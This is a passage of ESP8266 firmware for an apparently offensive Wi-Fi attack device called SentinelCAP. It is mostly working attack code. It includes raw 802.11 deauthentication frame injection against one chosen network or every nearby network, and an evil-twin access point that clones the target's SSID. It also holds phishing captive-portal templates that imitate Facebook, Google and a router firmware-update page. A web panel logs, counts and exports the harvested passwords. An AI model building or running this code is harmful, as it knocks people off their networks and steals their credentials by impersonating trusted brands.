                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const statusData = await response.json();
            
            document.getElementById('target-ssid').textContent = statusData.targetSsid || 'None Selected';
            
            isHotspotActive = statusData.hotspotActive;
            updateHotspotUI();
            
            isDeauthActive = statusData.deauthActive;
            isDeauthAllActive = statusData.deauthAllActive; // NEW: Update frontend flag
            updateDeauthUI();

            document.getElementById('password-count').textContent = statusData.passwordCount;
            document.getElementById('ip-address').textContent = statusData.ipAddress;
            document.getElementById('mac-address').textContent = statusData.macAddress;
            document.getElementById('uptime').textContent = statusData.uptime;
            document.getElementById('free-heap').textContent = statusData.freeHeap;
            document.getElementById('total-heap').textContent = statusData.totalHeap;

            const memoryPercent = statusData.memoryUsagePercent.toFixed(0);
            document.getElementById('memory-percent').textContent = `${memoryPercent}%`;

            let systemStatusText = 'Idle';
            if (isHotspotActive) systemStatusText = 'Evil Twin Active';
            if (isDeauthActive) {
                if (isDeauthAllActive) {
                    systemStatusText = 'Deauth All Active';
                } else {
                    systemStatusText = 'Deauth Active';
                }
            }
            if (isHotspotActive && isDeauthActive) systemStatusText = 'Evil Twin & Deauth Active';
            document.getElementById('system-status-text').textContent = systemStatusText;

            // Refresh logs periodically to show new captured passwords
            if (currentTab === 'logs' || currentTab === 'dashboard') {
                fetchLogs(); 
            }

        } catch (error) {
            console.error("Error fetching dashboard status:", error);
        }
    }, 3000);
}

async function generateReport() {
    addToTerminal('[INFO] Generating penetration test report...');
    try {
        const statusResponse = await fetch('/api/status');
        const statusData = await statusResponse.json();

        const logsResponse = await fetch('/api/logs');
        const logsData = await logsResponse.json();

        const filesResponse = await fetch('/api/files');
        const filesData = await filesResponse.json();

        const report = {
            timestamp: new Date().toISOString(),
            deviceInfo: {
                ipAddress: statusData.ipAddress,
                macAddress: statusData.macAddress,
                uptime: statusData.uptime,
                memoryUsage: `${statusData.memoryUsagePercent.toFixed(2)}% (${statusData.freeHeap}/${statusData.totalHeap} bytes free)`,
            },
            targetNetwork: {
                ssid: statusData.targetSsid,
                bssid: statusData.targetBssid,
                channel: statusData.targetChannel
            },
            attackStatus: {
                evilTwin: statusData.hotspotActive ? 'Active' : 'Inactive',
                deauthAttack: statusData.deauthActive ? 'Active' : 'Inactive',
                deauthAllAttack: statusData.deauthAllActive ? 'Active' : 'Inactive', // NEW
                capturedPasswordsCount: statusData.passwordCount
            },
            capturedPasswords: logsData.passwords.split('\n').filter(line => line.trim() !== ''),
            filesOnDevice: filesData.map(file => ({ name: file.name, size: file.size, type: file.type }))
        };
        
        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'sentinelcap_report.json';
        a.click();
        URL.revokeObjectURL(url);
        
        addToTerminal('[INFO] Penetration test report generated and downloaded.');
        showNotification('Report generated and downloaded!', 'success');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to generate report: ${error.message}`);
        console.error("Error generating report:", error);
        showNotification('Failed to generate report!', 'error');
    }
}

function getFacebookTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { color: #1877f2; font-size: 2.5em; font-weight: bold; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .wifi-notice { background: #e3f2fd; padding: 15px; border-radius: 6px; margin-bottom: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <div class="wifi-notice">
            <strong>WiFi Authentication Required</strong><br>
            Please log in to access {SSID} network
        </div>
        <form action="/submit_password" method="post">
            <input type="text" name="username" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>`;
}

function getGoogleTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google WiFi</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; }
        .container { max-width: 450px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 80px; }
        h1 { color: #202124; font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 30px; }
        .network-info { background: #f1f3f4; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        input { width: 100%; padding: 16px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border-color: #1a73e8; }
        button { width: 100%; background: #1a73e8; color: white; padding: 16px; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 16px; }
        button:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div style="font-size: 40px;">🌐</div>
        </div>
        <h1>Connect to WiFi</h1>
        <div class="network-info">
            <strong>Network:</strong> {SSID}<br>
            <strong>Security:</strong> WPA2-Personal
        </div>
        <form action="/submit_password" method="post">
            <input type="password" name="password" placeholder="Enter network password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>`;
}

function getRouterTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Configuration</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 500px; margin: 30px auto; background: white; border-radius: 5px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header { background: #2c3e50; color: white; padding: 20px; text-align: center; }
        .content { padding: 30px; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; background: #3498db; color: white; padding: 14px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #2980b9; }
        .device-info { background: #ecf0f1; padding: 15px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 Router Configuration</h1>
            <p>Firmware Update Required</p>
        </div>
        <div class="content">
            <div class="warning">
                <strong>Security Alert:</strong> Your router firmware is outdated. Please authenticate to install critical security updates.
            </div>
            <div class="device-info">
                <strong>Device:</strong> {SSID}<br>
                <strong>Model:</strong> Wireless Router AC1200<br>
                <strong>Current Version:</strong> 2.1.0<br>
                <strong>Available Version:</strong> 2.1.5 (Security Update)
            </div>
            <form action="/submit_password" method="post">
                <div class="form-group">
                    <label for="username">Administrator Username:</label>
                    <input type="text" id="username" name="username" value="admin" required>
                </div>
                <div class="form-group">
                    <label for="password">Administrator Password:</label>
                    <input type="password" id="password" name="password" placeholder="Enter admin password" required>
                </div>
                <button type="submit">Authenticate & Update Firmware</button>
            </form>
        </div>
    </div>
</body>
</html>`;
}
)rawliteral";

void setup() {
  Serial.begin(115200);
  Serial.println("\n[INFO] Starting " APP_NAME "...");

  Wire.begin(OLED_SDA_PIN, OLED_SCL_PIN);
  if(!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
    Serial.println(F("[FATAL] SSD1306 allocation failed. Aborting."));
    for(;;);
  }
  display.display();
  delay(2000);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("SentinelCAP");
  display.println("Initializing...");
  display.display();
  Serial.println("[INFO] OLED Display initialized.");


  if (!SPIFFS.begin()) {
    Serial.println("[ERROR] SPIFFS Mount Failed! Formatting...");
    SPIFFS.format();
    if (!SPIFFS.begin()) {
      Serial.println("[FATAL] SPIFF6S Mount Failed after format. Aborting.");
      while(true);
    }
    Serial.println("[INFO] SPIFFS formatted and mounted successfully.");
  } else {
    Serial.println("[INFO] SPIFFS mounted successfully.");
  }

  FSInfo fs_info;
  SPIFFS.info(fs_info);
  Serial.printf("[INFO] SPIFFS Total: %u bytes, Used: %u bytes\n", fs_info.totalBytes, fs_info.usedBytes);

  loadSettings();
  loadCapturedPasswords();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
  Serial.print("[INFO] Admin AP '" + appSettings.adminApSsid + "' started with IP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("[INFO] DNS Server started.");

  wifi_promiscuous_enable(1);

  webServer.on("/", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    webServer.send(200, "text/html", INDEX_HTML);
  });
  webServer.on("/style.css", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Serving /style.css");
    webServer.send(200, "text/css", STYLE_CSS);
  });
  webServer.on("/script.js", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    webServer.send(200, "application/javascript", SCRIPT_JS);
  });
  
  webServer.on("/api/scan", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiScan();
  });
  webServer.on("/api/manual_scan", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiManualScan();
  });
  webServer.on("/api/select_network", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiSelectNetwork();
  });
  webServer.on("/api/toggle_deauth", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiToggleDeauth();
  });
  webServer.on("/api/toggle_hotspot", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiToggleHotspot();
  });
  webServer.on("/api/status", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiStatus();
  });
  webServer.on("/api/logs", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiLogs();
  });
  webServer.on("/api/clear_logs", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiClearLogs();
  });
  webServer.on("/api/download_logs", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiDownloadLogs();
  });
  webServer.on("/api/files", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiFiles();
  });
  webServer.on("/api/deselect_network", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiDeselectNetwork();
  });

  webServer.on("/api/settings", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiGetSettings();
  });
  webServer.on("/api/settings", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiSaveSettings();
  });

  webServer.on("/upload", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleFileUpload();
  });
  webServer.on("/deletefile", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleFileDelete();
  });

  webServer.on("/generate_captive_portal", handleCaptivePortal);
  webServer.on("/submit_password", HTTP_POST, handleCaptivePortalSubmit);

  webServer.on("/restart", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleRestart();
  });

  webServer.on("/update", HTTP_POST, []() {
    if (!isAuthenticated()) {
      webServer.sendHeader("Connection", "close");
      webServer.send(401, "text/plain", "Unauthorized");
      return;
    }
    handleOTAUpdate();
    if (Update.isFinished()) {
      webServer.sendHeader("Connection", "close");
      webServer.send(200, "text/plain", "OK");
      ESP.restart();
    } else {
      webServer.sendHeader("Connection", "close");
      webServer.send(500, "text/plain", "FAIL");
    }
  }, []() {
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      Serial.printf("[OTA] Update: %s\n", upload.filename.c_str());
      if (!Update.begin(upload.totalSize)) { 
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_END) {
    } else if (upload.status == UPLOAD_FILE_ABORTED) {
      Serial.println("[OTA] Update aborted by client.");
    }
    delay(0);
  });


  webServer.onNotFound(handleNotFound);

  webServer.begin();
  Serial.println("[INFO] HTTP server started.");

  startTime = millis();
  updateOLEDDisplay();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // NEW: Deauthentication Attack Logic (Modified for Deauth All)
  if (deauthing_active) {
    deauthInterval = 1000 / appSettings.deauthPacketRate; 

    if (deauth_all_ssids) { // If deauth all SSIDs is active
      if (millis() - lastDeauthAllTime >= deauthInterval) {
        // Ensure we have networks to deauth
        int numNetworks = 0;
        for(int i = 0; i < 16; ++i) {
            if(_networks[i].ssid == "") break;
            numNetworks++;
        }

        if (numNetworks > 0) {
          // Move to the next network in the list
          currentDeauthAllIndex = (currentDeauthAllIndex + 1) % numNetworks;
          _Network targetNetwork = _networks[currentDeauthAllIndex];

          if (targetNetwork.ssid != "") { // Make sure it's a valid network entry
            uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                        0x00, 0x00,
                                        0x01, 0x00};

            memcpy(&deauthPacket[10], targetNetwork.bssid, 6);
            memcpy(&deauthPacket[16], targetNetwork.bssid, 6);

            wifi_set_channel(targetNetwork.ch);

            if (appSettings.enableDebugLogs) {
              Serial.printf("[DEAUTH ALL] Sending deauth packet to %s (Ch: %d, Index: %d/%d)\n", targetNetwork.ssid.c_str(), targetNetwork.ch, currentDeauthAllIndex + 1, numNetworks);
            }

            wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
            deauthPacketCount++; 
          }
        } else {
            if (appSettings.enableDebugLogs) Serial.println("[DEAUTH ALL] No networks to deauth. Performing scan...");
            performScan(); // Scan again if no networks found
        }
        lastDeauthAllTime = millis();
      }
      // Periodically rescan networks to keep the list fresh for deauth all
      if (millis() - lastScanTime >= 15000) { // Scan every 15 seconds
        performScan();
        lastScanTime = millis();
      }

    } else { // Single SSID deauth
      if (_selectedNetwork.ssid != "") {
        if (millis() - lastDeauthTime >= deauthInterval) {
          uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00,
                                      0x01, 0x00};

          memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
          memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);

          wifi_set_channel(_selectedNetwork.ch);

          if (appSettings.enableDebugLogs) {
            Serial.printf("[DEAUTH] Sending deauth packet to %s (Ch: %d)\n", _selectedNetwork.ssid.c_str(), _selectedNetwork.ch);
          }

          wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
          deauthPacketCount++; 
          
          lastDeauthTime = millis();
        }
      } else {
        // If deauth_active is true but no selected network (and not deauth_all_ssids), stop deauth
        deauthing_active = false;
        if (appSettings.enableDebugLogs) Serial.println("[WARNING] Deauth stopped: No target network selected for single deauth.");
      }
    }
  }

  if (millis() - lastWifiStatusCheck >= 2000) {
    lastWifiStatusCheck = millis();
  }

  if (millis() - lastOLEDUpdate >= 1000) {
    updateOLEDDisplay();
    lastOLEDUpdate = millis();
  }
}

void clearNetworkArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i] = {"", 0, {0, 0, 0, 0, 0, 0}, 0, ""};
  }
}

void performScan() {
  if (appSettings.enableDebugLogs) Serial.println("[SCAN] Starting WiFi scan...");
  int n = WiFi.scanNetworks(false, true);
  clearNetworkArray();
  if (n > 0) {
    if (appSettings.enableDebugLogs) {
      Serial.print("[SCAN] Found ");
      Serial.print(n);
      Serial.println(" networks.");
    }
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);
      network.security = getSecurityType(WiFi.encryptionType(i));
      _networks[i] = network;
      if (appSettings.enableDebugLogs) {
        Serial.printf("[SCAN] %d: %s, Ch: %d, RSSI: %d, BSSID: %s, Security: %s\n",
                      i + 1, network.ssid.c_str(), network.ch, network.rssi,
                      bytesToStr(network.bssid, 6).c_str(), network.security.c_str());
      }
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[SCAN] No networks found.");
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

String getSecurityType(uint8_t encryptionType) {
  switch (encryptionType) {
    case ENC_TYPE_NONE: return "Open";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA-PSK";
    case ENC_TYPE_CCMP: return "WPA2-PSK";
    case ENC_TYPE_AUTO: return "WPA/WPA2-PSK";
    default: return "Unknown";
  }
}

bool isAuthenticated() {
  if (appSettings.webAdminUsername.isEmpty() || appSettings.webAdminPassword.isEmpty()) {
    return true;
  }
  return webServer.authenticate(appSettings.webAdminUsername.c_str(), appSettings.webAdminPassword.c_str());
}


bool handleFileRead(String path) {
  if (appSettings.enableDebugLogs) Serial.println("handleFileRead: " + path);
  if (path.endsWith("/")) path += "index.html";
  String contentType = "text/plain";
  if (path.endsWith(".html")) contentType = "text/html";
  else if (path.endsWith(".css")) contentType = "text/css";
  else if (path.endsWith(".js")) contentType = "application/javascript";
  else if (path.endsWith(".png")) contentType = "image/png";
  else if (path.endsWith(".gif")) contentType = "image/gif";
  else if (path.endsWith(".jpg")) contentType = "image/jpeg";
  else if (path.endsWith(".ico")) contentType = "image/x-icon";
  else if (path.endsWith(".xml")) contentType = "text/xml";
  else if (path.endsWith(".pdf")) contentType = "application/pdf";
  else if (path.endsWith(".zip")) contentType = "application/zip";
  else if (path.endsWith(".json")) contentType = "application/json";

  if (SPIFFS.exists(path)) {
    File file = SPIFFS.open(path, "r");
    if (file) {
      webServer.streamFile(file, contentType);
      file.close();
      return true;
    }
  }
  return false;
}

void handleNotFound() {
  if (hotspot_active) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/generate_captive_portal", true);
    webServer.send(302, "text/plain", "");
  } else {
    if (!isAuthenticated()) {
      return webServer.requestAuthentication();
    }
    if (!handleFileRead(webServer.uri())) { 
        webServer.send(404, "text/plain", "404: Not Found");
    }
  }
}

void handleApiManualScan() {
  performScan();
  webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Scan initiated\"}");
}

void handleApiScan() {
  DynamicJsonDocument doc(3500);
  JsonArray networksArray = doc.to<JsonArray>();

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    JsonObject networkObj = networksArray.createNestedObject();
    networkObj["ssid"] = _networks[i].ssid;
    networkObj["bssid"] = bytesToStr(_networks[i].bssid, 6);
    networkObj["channel"] = _networks[i].ch;
    networkObj["rssi"] = _networks[i].rssi;
    networkObj["security"] = _networks[i].security;
  }

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiSelectNetwork() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(256);
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String bssidStr = doc["bssid"].as<String>();
    bool found = false;
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == bssidStr) {
        _selectedNetwork = _networks[i];
        found = true;
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Selected network: " + _selectedNetwork.ssid);
        break;
      }
    }

    if (found) {
      webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Network selected\"}");
    } else {
      webServer.send(404, "application/json", "{\"success\": false, \"message\": \"Network not found\"}");
    }
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

void handleApiToggleDeauth() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(256);
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    bool targetAll = doc["target_all"] | false; // Get target_all flag

    if (targetAll) {
      if (deauth_all_ssids) { // If already active, stop it
        deauthing_active = false;
        deauth_all_ssids = false;
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Deauthentication (All SSIDs) stopped.");
      } else { // If not active, start it
        if (hotspot_active) { // Cannot run deauth and hotspot simultaneously
          webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Cannot start Deauth All while Evil Twin is active.\"}");
          return;
        }
        deauthing_active = true;
        deauth_all_ssids = true;
        deauthStartTime = millis();
        deauthPacketCount = 0;
        currentDeauthAllIndex = 0; // Reset index for deauth all
        performScan(); // Ensure we have a fresh list of networks
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Deauthentication (All SSIDs) started.");
      }
    } else { // Single SSID deauth
      if (_selectedNetwork.ssid == "") {
        if (appSettings.enableDebugLogs) Serial.println("[WARNING] Cannot toggle deauth: No network selected.");
        webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No target network selected\"}");
        return;
      }
      if (hotspot_active) { // Cannot run deauth and hotspot simultaneously
          webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Cannot start Deauth while Evil Twin is active.\"}");
          return;
      }
      if (deauth_all_ssids) { // If deauth all is active, stop it first
        deauthing_active = false;
        deauth_all_ssids = false;
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Deauthentication (All SSIDs) stopped before starting single deauth.");
      }
      deauthing_active = !deauthing_active;
      deauth_all_ssids = false; // Ensure this is false for single deauth
      if (deauthing_active) {
          deauthStartTime = millis();
          deauthPacketCount = 0;
      }
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Deauthentication " + String(deauthing_active ? "started" : "stopped") + " for " + _selectedNetwork.ssid);
    }
    webServer.send(200, "application/json", "{\"success\": true, \"deauth_active\": " + String(deauthing_active ? "true" : "false") + ", \"deauth_all_active\": " + String(deauth_all_ssids ? "true" : "false") + "}");
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}


void handleApiToggleHotspot() {
  if (_selectedNetwork.ssid != "") {
    if (deauthing_active) { // Cannot run deauth and hotspot simultaneously
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Cannot start Evil Twin while Deauth is active. Stop deauth first.\"}");
      return;
    }

    hotspot_active = !hotspot_active;
    
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Stopping current AP and DNS server for AP mode change...");
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    delay(100);

    if (hotspot_active) {
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str()); 
      dnsServer.start(DNS_PORT, "*", apIP);
      evilTwinStartTime = millis(); // Start Evil Twin timer
      lastCapturedCredential = "None"; // Reset last captured credential
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Evil Twin hotspot started for: " + _selectedNetwork.ssid);
    } else {
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Evil Twin hotspot stopped. Admin AP restarted.");
    }
    webServer.send(200, "application/json", "{\"success\": true, \"hotspot_active\": " + String(hotspot_active ? "true" : "false") + "}");
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[WARNING] Cannot toggle hotspot: No network selected.");
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No target network selected\"}");
  }
}

void handleApiStatus() {
  DynamicJsonDocument doc(512);
  doc["targetSsid"] = _selectedNetwork.ssid;
  doc["targetBssid"] = bytesToStr(_selectedNetwork.bssid, 6);
  doc["targetChannel"] = _selectedNetwork.ch;
  doc["hotspotActive"] = hotspot_active;
  doc["deauthActive"] = deauthing_active;
  doc["deauthAllActive"] = deauth_all_ssids; // NEW: Report deauth all status

  int passwordCount = 0;
  if (_capturedPasswordsLog.length() > 0) {
    for (int i = 0; i < _capturedPasswordsLog.length(); i++) {
      if (_capturedPasswordsLog.charAt(i) == '\n') {
        passwordCount++;
      }
    }
  }
  doc["passwordCount"] = passwordCount;

  doc["ipAddress"] = WiFi.softAPIP().toString();
  doc["macAddress"] = WiFi.softAPmacAddress();
  
  unsigned long seconds = (millis() - startTime) / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;
  seconds %= 60;
  minutes %= 60;
  char uptimeBuffer[32];
  snprintf(uptimeBuffer, sizeof(uptimeBuffer), "%luh:%02lum:%02lus", hours, minutes, seconds);
  doc["uptime"] = uptimeBuffer;

  doc["freeHeap"] = ESP.getFreeHeap();
  const size_t TOTAL_HEAP_ESTIMATE = 80 * 1024;
  doc["totalHeap"] = TOTAL_HEAP_ESTIMATE;
  doc["memoryUsagePercent"] = (100.0 * (TOTAL_HEAP_ESTIMATE - ESP.getFreeHeap())) / TOTAL_HEAP_ESTIMATE;

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiLogs() {
  DynamicJsonDocument doc(4096);
  doc["passwords"] = _capturedPasswordsLog;
  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiClearLogs() {
  _capturedPasswordsLog = "";
  saveCapturedPasswords();
  if (appSettings.enableDebugLogs) Serial.println("[INFO] Password logs cleared.");
  webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Logs cleared\"}");
}

void handleApiDownloadLogs() {
  webServer.sendHeader("Content-Disposition", "attachment; filename=password_log.txt");
  webServer.send(200, "text/plain", _capturedPasswordsLog);
}

void handleApiFiles() {
  DynamicJsonDocument doc(2048);
  JsonArray filesArray = doc.to<JsonArray>();

  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    String fileName = dir.fileName();
    size_t fileSize = dir.fileSize();
    JsonObject fileObj = filesArray.createNestedObject();
    fileObj["name"] = fileName;
    fileObj["size"] = fileSize;
    if (fileName.endsWith(".html")) fileObj["type"] = "html";
    else if (fileName.endsWith(".css")) fileObj["type"] = "css";
    else if (fileName.endsWith(".js")) fileObj["type"] = "javascript";
    else if (fileName.endsWith(".json")) fileObj["type"] = "json";
    else if (fileName.endsWith(".log")) fileObj["type"] = "log";
    else if (fileName.endsWith(".txt")) fileObj["type"] = "text";
    else fileObj["type"] = "unknown";
  }

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiDeselectNetwork() {
  _selectedNetwork = {"", 0, {0, 0, 0, 0, 0, 0}, 0, ""};
  deauthing_active = false;
  deauth_all_ssids = false; // NEW: Reset deauth all
  hotspot_active = false;

  // Reset deauth and evil twin tracking
  deauthStartTime = 0;
  deauthPacketCount = 0;
  evilTwinStartTime = 0;
  lastCapturedCredential = "None";

  if (appSettings.enableDebugLogs) Serial.println("[INFO] Stopping current AP and DNS server for deselection...");
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
  dnsServer.start(DNS_PORT, "*", apIP);

  if (appSettings.enableDebugLogs) Serial.println("[INFO] Network deselected. All attacks stopped. Admin AP restarted.");
  webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Network deselected\"}");
}

void handleFileUpload() {
  HTTPUpload& upload = webServer.upload();
  if (upload.status == UPLOAD_FILE_START) {
    uploadErrorOccurred = false;
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    if (appSettings.enableDebugLogs) Serial.print("[FILE] Uploading: "); Serial.println(filename);
    SPIFFS.remove(filename);
    fsUploadFile = SPIFFS.open(filename, "w");
    if (!fsUploadFile) {
